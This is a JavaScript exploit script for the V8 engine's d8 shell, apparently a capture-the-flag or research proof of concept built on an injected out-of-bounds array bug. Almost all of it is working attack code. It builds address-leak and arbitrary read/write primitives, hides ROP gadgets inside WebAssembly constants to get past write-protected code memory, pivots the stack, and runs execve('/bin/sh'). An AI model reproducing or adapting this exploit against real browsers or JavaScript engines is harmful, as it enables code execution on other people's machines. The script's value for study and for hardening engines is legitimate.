// ./d8 --wasm-write-protect-code-memory wasm-pwn-rx.js

// https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
  u64_buf[0] = Number(val & 0xffffffffn);
  u64_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

function getHexString(val) {
  return "0x" + ftoi(val).toString(16);
}

/*
 * START OF BUG
 */

// .oob(idx) reads from idx
// .oob(idx, val) changes idx with val

const a =[ 1.1 ];
const obj = { A: 5.5 };
const obj_arr = [ obj ];
const a_map = a.oob(2);
var buffer = new ArrayBuffer(0x100); // 256 byte array buffer (used for rop payload and arb r/w)
const dataView = new DataView(buffer);

// addrof primitive (returns value without isolate root)
function addrof(obj) {
  obj_arr[0] = obj;
  return ftoi(a.oob(11)) & 0xffffffffn;
}

// get heap address (backing store of buffer)
const backing_store = (ftoi(a.oob(17)) >> 32n) + ((ftoi(a.oob(18)) & 0xffffffffn) << 32n);
console.log("[*] backing store address : " + getHexString(itof(backing_store)));

// arbitrary read primitive
function arb_read(address) {
  // addresses are 4 bytes aligned, but not 8 bytes aligned
  // need to store two 4-byte pieces
  const piece1 = ftoi(a.oob(17)) & 0xffffffffn;
  const piece2 = ftoi(a.oob(18)) >> 32n;
  const addr_low = address & 0xffffffffn;
  const addr_high = address >> 32n;
  const data1 = piece1 | (addr_low << 32n);
  const data2 = (piece2 << 32n) | addr_high;

  // overwrite backing store of buffer
  a.oob(17, itof(data1));
  a.oob(18, itof(data2));

  return ftoi(dataView.getFloat64(0, true));
}

// arbitrary write primitive
function arb_write(address, value) {
  // addresses are 4 bytes aligned, but not 8 bytes aligned
  // need to store two 4-byte pieces
  const piece1 = ftoi(a.oob(17)) & 0xffffffffn;
  const piece2 = ftoi(a.oob(18)) >> 32n;
  const addr_low = address & 0xffffffffn;
  const addr_high = address >> 32n;
  const data1 = piece1 | (addr_low << 32n);
  const data2 = (piece2 << 32n) | addr_high;

  // overwrite backing store of buffer
  a.oob(17, itof(data1));
  a.oob(18, itof(data2));

  dataView.setFloat64(0, itof(value), true);
}

// get isolate base (not reliable) (unused)
// const iso_base = arb_read(backing_store+0x40n) & 0xffffffff00000000n;
// console.log(getHexString(itof(iso_base)));

function copy_shellcode(addr, shellcode) {
  for (let i = 0; i < shellcode.length; i++) {
    arb_write(addr+8n*BigInt(i), shellcode[i]);
  }
}

// WASM TRIGGER RX PAGE

// https://wasdk.github.io/WasmFiddle/
const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);

// get wasm native heap page using oob read and addrof
// wasm heap address offset : 0x68 - 1 from addrOf(wasm_instance)
const wasm_idx = ((addrof(wasm_instance) - addrof(a)) / 8n) + 1n + 13n;
let rwx_page_addr = ftoi(a.oob(Number(wasm_idx)));
if ((addrof(wasm_instance) - addrof(a)) % 8n == 4n) {
  rwx_page_addr = (rwx_page_addr >> 32n) | ((ftoi(a.oob(Number(wasm_idx)+1)) & 0xffffffffn) << 32n)
}
console.log("[*] rwx page : " + getHexString(itof(rwx_page_addr)));

// wasm helper functions (leb encoding)
// https://github.com/shmishtopher/wasm-LEB128
function LEB128_s (value) {
  let bytes = [];
  let byte = 0x00;
  let size = 64n;
  let negative = value < 0;
  let more = true;

  while (more) {
    byte = Number(value & 127n);
    value = value >> 7n;

    if (negative) {
      value = value | (- (1n << (size - 7n)));
    }

    if (
      (value == 0 && ((byte & 0x40) == 0)) ||
      (value == -1 && ((byte & 0x40) == 0x40))
    ) {
      more = false;
    } 
    
    else {
      byte = byte | 128;
    }

    bytes.push(byte);
  }

  return bytes
}
function varint64 (value) {
  if (value > 9223372036854775807n) {
    return LEB128_s(value-0x10000000000000000n);
  } else {
    return LEB128_s(value);
  }
}

// insert ROP gadgets
/*
(module
 (table 0 anyfunc)
 (memory $0 1)
 (export "memory" (memory $0))
 (export "addThree" (func $addThree))
 (export "main" (func $main))
 (func $addThree (; 0 ;) (param $0 i64) (param $1 i64) (param $2 i64) (result i32)
  (i32.wrap_i64
   (i64.add
    (i64.add
     (get_local $1)
     (get_local $0)
    )
    (get_local $2)
   )
  )
 )
 (func $main (; 1 ;) (result i32)
  i64.const 18446744073709551615 ;; 0xffffffffffffffff
  i64.const 18446744073709551615 ;; 0xffffffffffffffff
  i64.const 18446744073709551615 ;; 0xffffffffffffffff
  call $addThree
 )
)
*/
const cbuffer_standard = [0,97,115,109,1,0,0,0,1,12,2,96,3,126,126,126,1,127,96,0,1,127,3,3,2,0,1,4,4,1,112,0,0,5,3,1,0,1,7,28,3,6,109,101,109,111,114,121,2,0,8,97,100,100,84,104,114,101,101,0,0,4,109,97,105,110,0,1,10,24,2,11,0,32,1,32,0,124,32,2,124,167,11,10,0,66,66,66,16,0,11];
const cbuffer_idx1 = 86; // first leb128 encoded i64.const
const cbuffer_idx2 = 87; // second leb128 encoded i64.const
const cbuffer_idx3 = 88; // third leb128 encoded i64.const
function insert_ROP_gadget(value1, value2, value3) {
  let cbuffer = [...cbuffer_standard];
  const leb_value1 = varint64(value1);
  const leb_value2 = varint64(value2);
  const leb_value3 = varint64(value3);
  cbuffer = cbuffer.slice(0, cbuffer_idx1).concat(leb_value1).concat(cbuffer.slice(cbuffer_idx1, cbuffer_idx2)).concat(leb_value2).concat(cbuffer.slice(cbuffer_idx2, cbuffer_idx3)).concat(leb_value3).concat(cbuffer.slice(cbuffer_idx3, cbuffer.length));
  cbuffer[69] = leb_value1.length + leb_value2.length + leb_value3.length + 21; // adjust length
  cbuffer[83] = leb_value1.length + leb_value2.length + leb_value3.length + 7; // adjust length
  const wasm_code = new Uint8Array(cbuffer);
  const wasm_mod = new WebAssembly.Module(wasm_code);
  const wasm_instance = new WebAssembly.Instance(wasm_mod);

  const wasm_idx = ((addrof(wasm_instance) - addrof(a)) / 8n) + 1n + 13n;
  let rwx_page_addr = ftoi(a.oob(Number(wasm_idx)));
  if ((addrof(wasm_instance) - addrof(a)) % 8n == 4n) {
    rwx_page_addr = (rwx_page_addr >> 32n) | ((ftoi(a.oob(Number(wasm_idx)+1)) & 0xffffffffn) << 32n)
  }
  return rwx_page_addr;
}

// ROP payload at backing_store
const off1 = 0x16n; // offset to first gadget
const off2 = 0x20n; // offset to second gadget
const off3 = 0x2an; // offset to third gadget

// mov esp, <backing store pointer high>; jmp short 0x3
// shl rsp, 0x32; jmp short 0x4
// add rsp, <backing store pointer low>; ret; or sub rsp, <backing store pointer low>; ret;
let backing_store_high = backing_store >> 32n;
let backing_store_low = backing_store & 0xffffffffn;
let g1;
if (backing_store_low >> 31n != 0n) { // to prevent sign extension
  backing_store_high = backing_store_high + 1n;
  backing_store_low = 0x100000000n - backing_store_low;
  g1 = insert_ROP_gadget(0x9003eb00000000bcn | (backing_store_high*0x100n), 0x909004eb20e4c148n, 0xc300000000ec8148n | (backing_store_low*0x1000000n));
}
else {
  g1 = insert_ROP_gadget(0x9003eb00000000bcn | (backing_store_high*0x100n), 0x909004eb20e4c148n, 0xc300000000c48148n | (backing_store_low*0x1000000n));
}
const g1_pos = (arb_read(g1) >> 48n) + 0xan; // offset of main export function

// pop rax; ret; pop rdi; ret; pop rsi; ret; pop rdx; ret;
// syscall; ret;
// nops
const g2 = insert_ROP_gadget(0xc35ac35ec35fc358n, 0x9090909090c3050fn, 0x9090909090909090n);
const g2_pos = (arb_read(g2) >> 48n) + 0xan; // offset of main export function

const piv_gadget = g1 + g1_pos + off1; // stack pivoting gadget
const pop_rax_gadget = g2 + g2_pos + off1; // pop rax; ret;
const pop_rdi_gadget = g2 + g2_pos + off1 + 0x2n; // pop rdi; ret;
const pop_rsi_gadget = g2 + g2_pos + off1 + 0x4n; // pop rsi; ret;
const pop_rdx_gadget = g2 + g2_pos + off1 + 0x6n; // pop rdx; ret;
const syscall_gadget = g2 + g2_pos + off2; // syscall; ret;

console.log("[*] stack pivoting gadget : " + getHexString(itof(piv_gadget)));
console.log("[*] pop rax ret gadget : " + getHexString(itof(pop_rax_gadget)));
console.log("[*] pop rdi ret gadget : " + getHexString(itof(pop_rdi_gadget)));
console.log("[*] pop rsi ret gadget : " + getHexString(itof(pop_rsi_gadget)));
console.log("[*] pop rdx ret gadget : " + getHexString(itof(pop_rdx_gadget)));
console.log("[*] syscall ret gadget : " + getHexString(itof(syscall_gadget)));

// restore backing store pointer
let piece1 = ftoi(a.oob(17)) & 0xffffffffn;
let piece2 = ftoi(a.oob(18)) >> 32n;
let addr_low = backing_store & 0xffffffffn;
let addr_high = backing_store >> 32n;
let data1 = piece1 | (addr_low << 32n);
let data2 = (piece2 << 32n) | addr_high;
a.oob(17, itof(data1));
a.oob(18, itof(data2));

// prepare ROP payload (payload is located in backing store)
dataView.setFloat64(0x00, itof(pop_rdi_gadget), true);
dataView.setFloat64(0x08, itof(backing_store+0x48n), true);
dataView.setFloat64(0x10, itof(pop_rsi_gadget), true);
dataView.setFloat64(0x18, itof(0x0n), true);
dataView.setFloat64(0x20, itof(pop_rdx_gadget), true);
dataView.setFloat64(0x28, itof(0x0n), true);
dataView.setFloat64(0x30, itof(pop_rax_gadget), true);
dataView.setFloat64(0x38, itof(59n), true);
dataView.setFloat64(0x40, itof(syscall_gadget), true);
dataView.setFloat64(0x48, itof(0x0068732f6e69622fn), true);

// stack pivoting and shell
// perform stack pivoting to backing store
// corrupt wasm code pointer (pc control)
const target_addr = piv_gadget; // target address
if ((addrof(wasm_instance) - addrof(a)) % 8n == 4n) {
  piece1 = ftoi(a.oob(Number(wasm_idx))) & 0xffffffffn;
  piece2 = ftoi(a.oob(Number(wasm_idx)+1)) >> 32n;
  addr_low = target_addr & 0xffffffffn;
  addr_high = target_addr >> 32n;
  data1 = piece1 | (addr_low << 32n);
  data2 = (piece2 << 32n) | addr_high;
  a.oob(Number(wasm_idx), itof(data1));
  a.oob(Number(wasm_idx)+1, itof(data2));
}
else {
  a.oob(Number(wasm_idx), itof(target_addr));
}

const f = wasm_instance.exports.main;
f();

// while(1);